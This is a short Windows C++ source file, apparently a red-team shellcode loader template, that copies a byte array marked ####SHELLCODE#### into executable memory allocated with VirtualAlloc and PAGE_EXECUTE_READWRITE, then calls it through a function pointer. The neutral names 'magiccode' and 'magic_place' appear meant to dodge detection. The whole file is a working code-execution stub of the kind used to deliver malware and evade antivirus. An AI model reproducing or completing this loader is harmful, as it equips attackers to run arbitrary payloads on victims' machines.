// Function pointer invoked self-injection
// Author: Thomas X Meng

#include <windows.h>
#include <cstdio>

unsigned char magiccode[] = ####SHELLCODE####;

int main(int argc, char *argv[])
{
    printf("Starting program...\n");
    SIZE_T magic_size = sizeof(magiccode);
 
    void * magic_place = VirtualAlloc( 0, magic_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
    memcpy( magic_place, magiccode, magic_size );
    ( (void ( * )())magic_place )();

    return 0;


}